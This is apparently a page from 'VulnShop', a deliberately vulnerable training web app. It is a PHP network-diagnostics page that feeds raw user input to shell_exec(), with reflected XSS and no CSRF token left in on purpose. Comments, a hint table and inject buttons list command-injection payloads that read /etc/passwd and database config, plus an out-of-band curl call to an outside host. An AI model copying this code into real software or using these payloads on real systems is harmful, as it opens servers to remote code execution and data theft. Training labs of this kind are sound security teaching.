<?php
// ============================================================
//  VulnShop - Network Diagnostics Tool
//  VULNERABILITIES:
//  - OS Command Injection: user input appended raw to shell_exec()
//  - Command chaining: ; && || | operators not stripped
//  - RCE: full remote code execution via command injection
// ============================================================
$page_title = 'Network Diagnostics';
require_once 'includes/header.php';

$output   = '';
$cmd_run  = '';
$tool     = isset($_POST['tool'])   ? $_POST['tool']   : 'ping';
$target   = isset($_POST['target']) ? $_POST['target'] : '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $target !== '') {
    // VULNERABILITY: $target appended directly to shell command — OS Command Injection
    // Payloads:
    //   127.0.0.1 ; whoami
    //   127.0.0.1 && cat /etc/passwd
    //   127.0.0.1 | net user         (Windows)
    //   127.0.0.1 || id
    //   `id`
    //   $(cat /etc/passwd)
    //   127.0.0.1 ; php -r 'system("id");'

    if ($tool === 'ping') {
        // -c 1 on Linux, -n 1 on Windows — detect OS
        $ping_flag = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? '-n 1' : '-c 1';
        $cmd_run = "ping $ping_flag $target";
    } elseif ($tool === 'nslookup') {
        $cmd_run = "nslookup $target";
    } elseif ($tool === 'traceroute') {
        $trace_cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'tracert' : 'traceroute';
        $cmd_run = "$trace_cmd $target";
    } elseif ($tool === 'curl') {
        // VULNERABILITY: curl + user input = SSRF + Command Injection combo
        $cmd_run = "curl -I $target";
    } elseif ($tool === 'whois') {
        $cmd_run = "whois $target";
    }

    // VULNERABILITY: shell_exec() with raw user input
    $output = shell_exec($cmd_run . ' 2>&1');
    if ($output === null || $output === '') {
        $output = "[No output or command blocked by OS]";
    }
}
?>

<div class="page-title">
    <h1><i class="fas fa-terminal"></i> Network Diagnostics</h1>
    <span class="vuln-tag">Command Injection (RCE)</span>
</div>

<div class="lab-hint">
    <h4><i class="fas fa-flask"></i> Vulnerability: OS Command Injection</h4>
    <table>
        <tr><th>Separator</th><th>Payload (in Target field)</th><th>Effect</th></tr>
        <tr><td>Semicolon</td>   <td><code>127.0.0.1 ; whoami</code></td><td>Run second command</td></tr>
        <tr><td>AND</td>         <td><code>127.0.0.1 &amp;&amp; id</code></td><td>Run if first succeeds</td></tr>
        <tr><td>Pipe</td>        <td><code>127.0.0.1 | cat /etc/passwd</code></td><td>Pipe output</td></tr>
        <tr><td>OR</td>          <td><code>invalid || whoami</code></td><td>Run if first fails</td></tr>
        <tr><td>Backtick</td>    <td><code>127.0.0.1 `id`</code></td><td>Inline execution</td></tr>
        <tr><td>Subshell</td>    <td><code>$(cat /etc/passwd)</code></td><td>Subshell execution</td></tr>
        <tr><td>Newline</td>     <td><code>127.0.0.1%0aid</code></td><td>Newline bypass</td></tr>
        <tr><td>Windows</td>     <td><code>127.0.0.1 &amp; net user</code></td><td>List users (Win)</td></tr>
        <tr><td>Win dir</td>     <td><code>127.0.0.1 &amp; dir C:\</code></td><td>List C drive</td></tr>
        <tr><td>Blind OOB</td>   <td><code>127.0.0.1; curl http://burpcollab.net</code></td><td>Out-of-band</td></tr>
    </table>
</div>

<div class="two-col-layout">
    <div class="checkout-section">
        <h3><i class="fas fa-network-wired"></i> Run Diagnostic</h3>
        <!-- VULNERABILITY: no CSRF token, no input sanitisation -->
        <form method="POST">
            <div class="form-group">
                <label>Tool</label>
                <select name="tool" class="form-control">
                    <option value="ping"       <?php echo $tool==='ping'?'selected':''; ?>>Ping</option>
                    <option value="nslookup"   <?php echo $tool==='nslookup'?'selected':''; ?>>NSLookup</option>
                    <option value="traceroute" <?php echo $tool==='traceroute'?'selected':''; ?>>Traceroute</option>
                    <option value="curl"       <?php echo $tool==='curl'?'selected':''; ?>>cURL (HTTP HEAD)</option>
                    <option value="whois"      <?php echo $tool==='whois'?'selected':''; ?>>Whois</option>
                </select>
            </div>
            <div class="form-group">
                <label>Target <small style="color:#e74c3c">(injected directly into shell — no escaping!)</small></label>
                <!-- VULNERABILITY: value reflected raw (XSS too) -->
                <input type="text" name="target" class="form-control"
                       value="<?php echo $target; ?>"
                       placeholder="127.0.0.1 ; whoami">
            </div>
            <button type="submit" class="btn btn-primary">
                <i class="fas fa-play"></i> Run
            </button>
            <!-- Quick inject buttons -->
            <div style="margin-top:10px;display:flex;flex-wrap:wrap;gap:6px">
                <button type="button" class="btn btn-sm btn-danger"
                    onclick="document.querySelector('[name=target]').value='127.0.0.1 ; whoami'">whoami</button>
                <button type="button" class="btn btn-sm btn-danger"
                    onclick="document.querySelector('[name=target]').value='127.0.0.1 && id'">id</button>
                <button type="button" class="btn btn-sm btn-danger"
                    onclick="document.querySelector('[name=target]').value='127.0.0.1 | cat /etc/passwd'">passwd</button>
                <button type="button" class="btn btn-sm btn-danger"
                    onclick="document.querySelector('[name=target]').value='127.0.0.1 & dir C:\\'">dir C:</button>
                <button type="button" class="btn btn-sm btn-danger"
                    onclick="document.querySelector('[name=target]').value='127.0.0.1 && cat includes/db.php'">db.php</button>
            </div>
        </form>
    </div>

    <div class="checkout-section">
        <h3><i class="fas fa-terminal"></i> Output
            <?php if ($cmd_run): ?>
                <small style="font-weight:normal;color:#64748b;font-size:0.78rem"> — ran: <code><?php echo htmlspecialchars($cmd_run); ?></code></small>
            <?php endif; ?>
        </h3>
        <?php if ($output): ?>
            <pre class="file-output"><?php echo htmlspecialchars($output); ?></pre>
        <?php else: ?>
            <p style="color:#94a3b8;text-align:center;padding:30px 0">Output will appear here after running a command.</p>
        <?php endif; ?>
    </div>
</div>

<?php require_once 'includes/footer.php'; ?>
